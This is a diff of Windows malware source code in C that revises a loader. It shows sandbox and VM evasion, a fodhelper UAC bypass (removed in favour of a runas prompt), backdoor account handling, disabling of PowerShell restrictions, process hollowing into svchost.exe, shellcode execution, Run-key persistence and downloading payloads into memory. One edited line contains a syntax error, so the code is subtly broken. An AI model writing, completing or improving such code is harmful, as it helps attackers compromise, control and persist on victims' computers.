@@ -50,7 +50,7 @@ void RandomSleep(DWORD base, DWORD variance);
 void EvadeMemoryScanners();
 
 // Privilege and execution
-BOOL ElevatePrivileges();
+BOOL ElevateToAdmin();
 BOOL IsAdmin();
 void CreateBackdoorAccount();
 void RemoveBackdoorAccount();
@@ -74,7 +74,6 @@ void CleanupTemporaryResources();
 OBF_STR ObfuscateString(const char* input, DWORD key);
 char* Deobfuscate(const OBF_STR* obf);
 void SecureFree(void* ptr, size_t size);
-void CleanTrace();
 BOOL PrepareMallDirectory();
 
 // Random generator
@@ -140,9 +139,6 @@ void AntiSandbox() {
     GetDiskFreeSpaceExA("C:\\", NULL, &freeBytes, NULL);
     if (freeBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)) ExitProcess(0);
     
-    // Enhanced VM detection
-    if (GetSystemMetrics(SM_REMOTESESSION)) ExitProcess(0);  // RDP session
-    
     // Check for common VM drivers
     const char* drivers[] = {
         "vboxmrxnp.dll", "vboxogl.dll", "vmtools.dll", 
@@ -178,34 +174,22 @@ void AntiSandbox() {
     }
 }
 
-// Privilege escalation with UAC bypass
-BOOL ElevatePrivileges() {
+// Admin elevation using standard UAC prompt
+BOOL ElevateToAdmin() {
     char selfPath[MAX_PATH];
     if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return FALSE;
 
-    // Use fodhelper UAC bypass
-    HKEY hKey;
-    if (RegCreateKeyA(HKEY_CURRENT_USER, 
-        "Software\\Classes\\ms-settings\\shell\\open\\command", &hKey) != ERROR_SUCCESS) 
-        return FALSE;
-    
-    DWORD pathLen = lstrlenA(selfPath) + 1;
-    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)selfPath, pathLen);
-    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
-    RegCloseKey(hKey);
-    
-    // Trigger activation
     SHELLEXECUTEINFOA sei = { sizeof(sei) };
-    sei.lpFile = "cmd.exe";
-    sei.lpParameters = "/c start fodhelper.exe";
+    sei.lpVerb = "runas";
+    sei.lpFile = selfPath;
     sei.nShow = SW_HIDE;
     
-    if (!ShellExecuteExA(&sei)) return FALSE;
-    
-    // Cleanup
-    Sleep(5000);
-    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
-    return TRUE;
+    if (ShellExecuteExA(&sei)) {
+        // Wait for elevated process to start
+        Sleep(5000);
+        return TRUE;
+    }
+    return FALSE;
 }
 
 // Admin check
@@ -306,15 +290,18 @@ void RemoveBackdoorAccount() {
         return;
     }
     
-    // Delete account
-    NET_API_STATUS status = NetUserDel(NULL, usernameW);
-    if (status != NERR_Success) {
-        // PowerShell fallback
-        char psCmd[256];
-        wsprintfA(psCmd, "powershell -Command \"Remove-LocalUser -Name '%S' -ErrorAction SilentlyContinue\"", 
-                 usernameW);
-        RunHiddenCommand(psCmd);
+    // Delete account with retries
+    for (int i = 0; i < 3; i++) {
+        NET_API_STATUS status = NetUserDel(NULL, usernameW);
+        if (status == NERR_Success) break;
+        Sleep(2000);
     }
+    
+    // PowerShell fallback
+    char psCmd[256];
+    wsprintfA(psCmd, "powershell -Command \"Remove-LocalUser -Name '%S' -Force -ErrorAction SilentlyContinue\"", 
+             usernameW);
+    RunHiddenCommand(psCmd);
     
     // Clean registry entry
     HKEY hKey;
@@ -336,20 +323,21 @@ void DisablePowerShellRestrictions() {
     char* realValue = Deobfuscate(&value);
     char* realData = Deobfuscate(&data);
     
-    if (!realSubkey || !realValue || !realData) return;
+    if (!realSubkey || !realValue || !realData) goto cleanup;
     
     if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, realSubkey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        DWORD dataLen = strlen(realData) + 1;
+        DWORD dataLen = (DWORD)strlen(realData) + 1;
         RegSetValueExA(hKey, realValue, 0, REG_SZ, (const BYTE*)realData, dataLen);
         RegCloseKey(hKey);
     }
-    
-    SecureFree(realSubkey, subkey.len);
-    SecureFree(realValue, value.len);
-    SecureFree(realData, data.len);
-    SecureFree(subkey.data, subkey.len);
-    SecureFree(value.data, value.len);
-    SecureFree(data.data, data.len);
+
+cleanup:
+    if (realSubkey) SecureFree(realSubkey, subkey.len);
+    if (realValue) SecureFree(realValue, value.len);
+    if (realData) SecureFree(realData, data.len);
+    if (subkey.data) SecureFree(subkey.data, subkey.len);
+    if (value.data) SecureFree(value.data, value.len);
+    if (data.data) SecureFree(data.data, data.len);
 }
 
 // Function to execute PE from memory using process hollowing
@@ -368,12 +356,16 @@ BOOL ExecutePEFromMemory(BYTE* peData, DWORD peSize) {
     IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(peData + dosHeader->e_lfanew);
     if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;
 
+    // Get system directory for svchost.exe
+    char dummyCmd[MAX_PATH];
+    GetSystemDirectoryA(dummyCmd, MAX_PATH);
+    PathAppendA(dummyCmd, "svchost.exe");
+
     // Create suspended process
     STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    char dummyCmd[] = "svchost.exe";
 
-    if (!CreateProcessA(NULL, dummyCmd, NULL, NULL, FALSE, 
+    if (!CreateProcessA(dummyCmd, NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         return FALSE;
     }
@@ -483,13 +475,7 @@ BOOL ExecuteShellcode(BYTE* shellcode, DWORD size) {
         return FALSE;
     }
     
-    // Wait briefly to ensure execution starts
-    WaitForSingleObject(hThread, 5000);
-    
-    // Anti-forensics: Clean memory after execution
-    SecureZeroMemory(execMem, size);
-    VirtualFree(execMem, 0, MEM_RELEASE);
-    
+    // Return immediately without waiting
     CloseHandle(hThread);
     return TRUE;
 }
@@ -788,7 +774,7 @@ void AddToStartup(const char* appName, const char* appPath) {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                      0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        DWORD pathLen = lstrlenA(appPath) + 1;
+        DWORD pathLen = (DWORD)lstrlenA(appPath) + 1;
         RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, pathLen);
         RegCloseKey(hKey);
     }
@@ -888,7 +874,7 @@ BYTE* DownloadToMemory(const char* url, DWORD* pSize) {
     BYTE chunk[4096];
     DWORD bytesRead;
 
-    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead)) {
+    while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) {
         if (bytesRead == 0) break;
 
         BYTE* newBuffer = (BYTE*)realloc(buffer, bufferSize + bytesRead);
@@ -988,10 +974,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     RandomSleep(5000, 2000);
     
     if(!IsAdmin()) {
-        if (!ElevatePrivileges()) {
+        // Use standard UAC elevation prompt
+        if (ElevateToAdmin()) {
+            // Original instance exits after launching elevated copy
             return 0;
         }
-        return 0;
+        // If elevation fails, continue with limited functionality
     }
     
     my_srand(GetTickCount());
@@ -1020,10 +1008,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         
         if (stages == 0xF) break;
-        RandomSleep(5000, 3000);
+        RandomSleep(8000, 5000);  // Increased sleep duration
     }
     
-    RandomSleep(PAYLOAD_DELAY, 15000);
+    RandomSleep(PAYLOAD_DELAY, 30000);  // Extended payload delay
     CleanupTemporaryResources();
     
     return 0;
